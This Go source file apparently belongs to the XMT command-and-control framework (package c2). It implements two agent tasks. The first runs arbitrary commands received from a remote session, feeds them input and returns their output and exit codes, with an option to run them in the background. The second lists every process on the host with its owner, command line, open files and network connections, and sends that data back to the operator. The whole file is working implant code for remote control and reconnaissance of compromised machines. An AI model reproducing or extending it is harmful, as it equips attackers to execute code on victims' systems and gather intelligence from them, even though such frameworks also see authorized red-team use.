package c2

import (
	"context"
	"os/exec"
	"time"

	ps "github.com/shirou/gopsutil/process"

	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/data"
)

type execute bool
type processList bool
type processInfo struct {
	PID      int32             `json:"pid"`
	PPID     int32             `json:"ppid"`
	Name     string            `json:"name"`
	Path     string            `json:"path"`
	Files    []string          `json:"files"`
	Create   time.Time         `json:"create"`
	Cmdline  []string          `json:"cmdline"`
	Network  []*processNetwork `json:"network"`
	Username string            `json:"username"`
}
type executeData struct {
	Args       []string
	Input      []byte
	Timeout    uint16
	Background bool

	ctx    context.Context
	cancel context.CancelFunc
}
type processNetwork struct {
	Local  string `json:"local"`
	Remote string `json:"remote"`
	Family int8   `json:"family"`
	Status string `json:"status"`
}

func (execute) Thread() bool {
	return true
}
func (processList) Thread() bool {
	return false
}
func (e execute) New(c ...string) *com.Packet {
	return e.PacketEx(false, 0, nil, c...)
}
func (e execute) Packet(t int, c ...string) *com.Packet {
	return e.PacketEx(false, t, nil, c...)
}
func (e *executeData) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(e.Background); err != nil {
		return err
	}
	if err := w.WriteUint16(e.Timeout); err != nil {
		return err
	}
	if err := data.WriteStringList(w, e.Args); err != nil {
		return err
	}
	if err := w.WriteBytes(e.Input); err != nil {
		return err
	}
	return nil
}
func (e *executeData) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&(e.Background)); err != nil {
		return err
	}
	if err := r.ReadUint16(&(e.Timeout)); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &(e.Args)); err != nil {
		return err
	}
	var err error
	if e.Input, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func (execute) Execute(s *Session, r data.Reader, w data.Writer) error {
	e := new(executeData)
	if err := e.UnmarshalStream(r); err != nil {
		return err
	}
	if e.Timeout > 0 {
		e.ctx, e.cancel = context.WithTimeout(s.Context(), time.Duration(e.Timeout)*time.Millisecond)
	} else {
		e.ctx, e.cancel = context.WithCancel(s.Context())
	}
	var p *exec.Cmd
	if len(e.Args) == 1 {
		p = exec.CommandContext(e.ctx, e.Args[0])
	} else {
		p = exec.CommandContext(e.ctx, e.Args[0], e.Args[1:]...)
	}
	if !e.Background {
		p.Stdout = w
		p.Stderr = w
	}
	if len(e.Input) > 0 {
		i, err := p.StdinPipe()
		if err != nil {
			e.cancel()
			return err
		}
		if _, err := i.Write(e.Input); err != nil {
			e.cancel()
			return err
		}
		if err := i.Close(); err != nil {
			e.cancel()
			return err
		}
	}
	if err := p.Start(); err != nil {
		e.cancel()
		return err
	}
	w.WriteBool(e.Background)
	w.WriteUint64(uint64(p.Process.Pid))
	if e.Background {
		go func(x *exec.Cmd, f context.CancelFunc) {
			x.Wait()
			f()
		}(p, e.cancel)
		return nil
	}
	defer e.cancel()
	err := p.Wait()
	w.WriteInt32(int32(p.ProcessState.ExitCode()))
	return err
}
func getProcess(x context.Context, a bool, p *ps.Process) *processInfo {
	i := &processInfo{
		PID: p.Pid,
	}
	i.Path, _ = p.ExeWithContext(x)
	i.Name, _ = p.NameWithContext(x)
	i.PPID, _ = p.PpidWithContext(x)
	i.Username, _ = p.UsernameWithContext(x)
	i.Cmdline, _ = p.CmdlineSliceWithContext(x)
	if t, err := p.CreateTimeWithContext(x); err == nil {
		i.Create = time.Unix(t, 0)
	}
	if a {
		if f, err := p.OpenFilesWithContext(x); err == nil && len(f) > 0 {
			i.Files = make([]string, len(f))
			for x := range f {
				i.Files[x] = f[x].Path
			}
		}
		if n, err := p.ConnectionsWithContext(x); err == nil && len(n) > 0 {
			i.Network = make([]*processNetwork, 0, len(n))
			for x := range n {
				if n[x].Laddr.Port == 0 {
					continue
				}
				i.Network = append(i.Network, &processNetwork{
					Local:  n[x].Laddr.String(),
					Status: n[x].Status,
					Family: int8(n[x].Family),
					Remote: n[x].Raddr.String(),
				})
			}
		}
	}
	return i
}
func (execute) PacketEx(b bool, t int, i []byte, c ...string) *com.Packet {
	x := &executeData{
		Args:       c,
		Input:      i,
		Timeout:    uint16(t),
		Background: b,
	}
	p := &com.Packet{ID: MsgExecute}
	x.MarshalStream(p)
	p.Close()
	return p
}
func (processList) Execute(s *Session, r data.Reader, w data.Writer) error {
	a, err := r.Bool()
	if err != nil {
		return nil
	}
	l, err := ps.Processes()
	if err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(len(l))); err != nil {
		return err
	}
	var p *processInfo
	for i := range l {
		p = getProcess(s.Context(), a, l[i])
		if err := p.MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}

func (p *processInfo) MarshalStream(w data.Writer) error {
	if err := w.WriteInt32(p.PID); err != nil {
		return err
	}
	if err := w.WriteInt32(p.PPID); err != nil {
		return err
	}
	if err := w.WriteString(p.Name); err != nil {
		return err
	}
	if err := w.WriteString(p.Path); err != nil {
		return err
	}
	if err := w.WriteString(p.Username); err != nil {
		return err
	}
	if err := w.WriteInt64(p.Create.Unix()); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Cmdline); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Files); err != nil {
		return err
	}
	if p.Network != nil && len(p.Network) > 0 {
		if err := w.WriteUint16(uint16(len(p.Network))); err != nil {
			return err
		}
		for i := range p.Network {
			if err := p.Network[i].MarshalStream(w); err != nil {
				return err
			}
		}
	} else {
		if err := w.WriteUint16(0); err != nil {
			return err
		}
	}
	return nil
}
func (p *processInfo) UnmarshalStream(r data.Reader) error {
	return nil
}

func (p *processNetwork) MarshalStream(w data.Writer) error {
	if err := w.WriteInt8(p.Family); err != nil {
		return err
	}
	if err := w.WriteString(p.Status); err != nil {
		return err
	}
	if err := w.WriteString(p.Local); err != nil {
		return err
	}
	if err := w.WriteString(p.Remote); err != nil {
		return err
	}
	return nil
}
func (p *processNetwork) UnmarshalStream(r data.Reader) error {
	return nil
}
